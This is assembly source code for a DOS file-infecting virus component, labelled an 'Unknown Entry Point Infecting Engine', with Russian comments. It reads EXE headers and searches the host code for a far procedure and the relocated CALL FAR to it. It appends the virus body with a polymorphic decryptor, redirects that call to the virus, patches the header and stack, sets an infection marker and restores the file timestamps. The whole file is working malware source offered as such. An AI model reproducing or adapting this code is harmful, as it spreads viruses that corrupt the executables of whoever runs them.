
;   Unknown Entry Point Infecting Engine
;   ────────────────────────────────────

MZ_sign 	equ	Header
PartPage	equ	Header+2
PageCnt 	equ	Header+4
RelocCnt	equ	Header+6
HdrSize 	equ	Header+8
StackPointer	equ	Header+0Eh
ChekSum 	equ	Header+12h
EntryPoint	equ	Header+14h

;Не устанавливает идентификатор зараженности
;eax - на выходе исходное Дата/Время

UEPinfect	proc	near

		mov	bx,[handle]
		mov	ah,3Fh
		mov	cx,1Ah
		mov	dx,offset Header
		call	DOS

		cmp	word ptr [MZ_sign],'ZM'  ;Не EXE'шник
		jne	ExitUEPInfect

		cmp	word ptr [RelocCnt],0	 ;Нет Reloc элементов -
		je	ExitUEPInfect		 ;нет дальних вызовов


		call	GetFPB
		mov	edx,es:[di+11h]   ;edx - RealLen

		mov	ax,word ptr [PageCnt] ;Реальная длинна больше загружаемой
		movzx	eax,ax
		shl	eax,9
		cmp	eax,edx
		jc	ExitUEPInfect	  ;Скрытый Overlay

		mov	eax,es:[di+0Dh] 	  ;Время/Дата
		mov	dword ptr [TimeDate],eax

		mov	word ptr [ProgID],'ZM'

;отьедем на начало кодового сегмента
		mov	bp,word ptr [EntryPoint+2]
		shl	ebp,4
		mov	dx,word ptr [HdrSize]
		shl	dx,4
		movzx	edx,dx
		add	ebp,edx

		mov	es:[di+15h],ebp

		mov	ax,word ptr [EntryPoint+2] ;FileCS
		mov	bx,word ptr [StackPointer]
		sub	bx,ax
		mov	ax,0FFFh
		jnc	@temp4
		mov	bx,ax  ;BX - сколько параграфов нужно считать из файла
@temp4: 		       ;Не больше 64Кб
		and	bx,ax
;Выделим память - предполагается что ее достаточно > 64Кб
		mov	ah,48h
		call	DOS
		jc	ExitUEPinfect

		mov	es,ax
;Читаем кодовый сегмент из файла
		mov	cx,bx								 │
		shl	cx,4	;в байтах
		push	ds

		push	es	;DS - на выделенный блок
		pop	ds

		mov	bx,cs:[handle]
		mov	ah,3Fh
		xor	dx,dx
		call	DOS
		pop	ds
		mov	[LenCode],ax

;Ищем точку входа для вируса
		mov	cx,4
		mov	word ptr [StartCode],0
FindUEP:
		push	cx
		call	SearchProc	 ;Ищем дальнюю процедуру
		pop	cx
		jc	ExitUEPInfect
		push	cx
		call	SearchXref	 ;Ищем на нее релокейшн
		pop	cx
		jnc	UEPisFound
		dec	cx
		jne	FindUEP
FarPRCnotFND:
		jmp	ExitUEPinfect  ;Ну вот только память зря запоганили...:(
UEPisFound:
		mov	eax,es:[di]
		mov	dword ptr [OldReloc],eax ;Сохраняем настоящий адрес

;Убьем выделенный блок - Код проги нам больше не нужен
		mov	ah,49h
		call	DOS

;Далее идет стандартный Appending

		mov	bx,[handle]
		call	GetFPB

		mov	eax,es:[di+11h]    ;В конец

		mov	dx,word ptr [PartPage]
		neg	dl
		and	dx,0Fh
		movzx	edx,dx
		add	eax,edx

		mov	es:[di+15h],eax
		push	eax	 ───────────────────┐
;Далее идет вызов на формирование Polymorp'a	    │
;Заполняет LenDecryptor 			    │
;Пишем вирус					    │
		mov	ah,40h			    │
		mov	cx,VirLen		    │
		add	cx,[LenDecryptor]	    │
		mov	dx,offset VirPlace	    │
		call	DOS			    │
						    │
;Сформируем точку входа в вирус 		    │				    │
		mov	ax,word ptr [HdrSize]	    │
		shl	ax,4			    │
		movzx	eax,ax			    │
		pop	edx	   ─────────────────┘
		sub	edx,eax
		shr	edx,4
		ror	edx,16
		mov	dx,VirEntryPoint
		push	edx	  ──────────────────┐
						    │
;Отьедем на вызов PRC в файле			    │
						    │
		mov	ax,[OffsFarCall]	    │
		movzx	eax,ax			    │
		add	ebp,eax 		    │
		mov	es:[di+15h],ebp 	    │
;Пишем нашу точку входа со стека		    │
		mov	dx,sp			    │
		push	ds			    │
		push	ss			    │
		pop	ds			    │
		mov	cx,4			    │
		mov	ah,40h			    │
		call	DOS			    │
		pop	ds			    │
						    │
		mov	ah,68h	     ;Сбросим Буфера DOS
		call	DOS			    │
						    │
		pop	edx	  ──────────────────┘

;Перекрываются ли вирус и стек - ?
		ror	edx,16
		mov	cx,dx
		mov	ax,word ptr [StackPointer+2]
		shr	ax,4
		inc	ax
		sub	dx,ax
		sub	dx,word ptr [StackPointer]
		jnc	NotCross
;Переместим FileSS за вирус
		add	cx,160
		mov	word ptr [StackPointer],cx
NotCross:
;Скорректируем длинну в заголовке
		mov	edx,es:[di+11h]   ;edx - RealLen
		mov	ax,dx
		and	ax,1FFh        ;Новая длинна в заголовке
		mov	word ptr [PartPage],ax
		pushf
		shr	edx,9
		popf
		jz	@temp
		inc	dx
@temp:
		mov	word ptr [PageCnt],dx
		mov	word ptr [ChekSum],VrID

		xor	eax,eax
		mov	es:[di+15h],eax

		mov	ah,40h
		mov	cx,1Ah
		mov	dx,offset Header
		mov	bx,[handle]
		call	DOS
		mov	ah,68h	     ;Сбросим Буфера DOS
		call	DOS

		mov	eax,12345678h
TimeDate	equ	$-4
		clc
		ret
ExitUEPInfect:	stc
		ret
UEPinfect	endp
;──────────────────────────────────────────────────────
SearchProc	proc	near
;Поиск стандартной дальней процедуры в первых 64Кб кода
;
;  Типа:	push	bp	   ИЛИ	    enter immN,immM
;		mov	bp,sp		      .
;		 .			      .
;		 .			      .
;		 .			      .
;		pop	bp		    leave
;		retf [imm8]		    retf  imm8
;
;ES - Scanned programm code
;DS - Virus Data

		mov	dx,0FFFFh	;ID что процедура не найдена
		mov	cx,[LenCode]
		mov	[EnterProc],dx
		mov	di,[StartCode]
Scan:
		mov	al,es:[di]
		cmp	al,55h		;push BP
		je	pushBP
		cmp	al,0C8h 	;enter immN,immM
		je	enterPRC
		cmp	al,5Dh		;pop BP
		je	exitPRC
		cmp	al,0C9h 	;leave
		je	exitPRC
NextScan:
		inc	di
		dec	cx
		jne	Scan
		stc
		retn
pushBP:
		cmp	word ptr es:[di+1],0EC8Bh	;mov bp,sp
		jne	NextScan
enterPRC:
		mov	[EnterProc],di
		jmp	NextScan
exitPRC:
		cmp	[EnterProc],dx
		je	NextScan
		mov	al,es:[di+1]
		cmp	al,0CBh 	;retf
		je	OK
		cmp	al,0CAh 	;retf imm8
		je	OK
		mov	[EnterProc],dx
		jmp	NextScan
OK:		inc	di		;Для поиска следующей
		mov	[StartCode],di
		clc
		ret
SearchProc	endp
;────────────────────────────────────────────────────────────────
SearchXRef	proc	near
;Ищет Релокейшн на найденную дальнюю процедуру в первых 64Кб кода
;ES - Scanned programm code
;DS - Virus Data

		xor	di,di
		mov	cx,[LenCode]
		mov	ax,word ptr [EntryPoint+2]
		mov	dx,[EnterProc]
		mov	word ptr [OffsetPRC],dx
		mov	word ptr [OffsetPRC+2],ax
Search:
		cmp	byte ptr es:[di],9Ah
		jne	NextSearch
TestXref:
		cmp	dword ptr es:[di+1],12345678h
OffsetPRC	equ	$-4
		je	FoundFarCall		;Следующий Сегментный адрес
		inc	word ptr [OffsetPRC+2]
		sub	word ptr [OffsetPRC],10h
		jnc	TestXref

		mov	word ptr [OffsetPRC],dx
		mov	word ptr [OffsetPRC+2],ax
NextSearch:
		inc	di
		dec	cx
		jne	Search
		stc
		ret
FoundFarCall:	inc	di
		mov	[OffsFarCall],di   ; DI - адрес операнда в CALL FAR
		clc
		ret
SearchXRef	endp
;────────────────────────────────────────────
GetFPB		proc
;Возвращает в ES:DI адрес File Parameter Block
;BX - Handle
		push	bx
		push	ax
		mov	ax,1220h	;Номер входа в SFT
		int	2Fh		;ES:[di]

		mov	bl,es:[di]	;Получим блок описания файла
		mov	ax,1216h	;es:di
		int	2Fh

		pop	ax
		pop	bx
		ret
GetFPB		endp
;─────────────── UEP Engine DATA ─────────────────
StartCode	dw	0
LenCode 	dw	0
EnterProc	dw	0
OffsFarCall	dw	0
TempHandle	dw	0
ProgID		dw	'MZ'
OldReloc	dd	0
;─────────────────────────────────────────────────
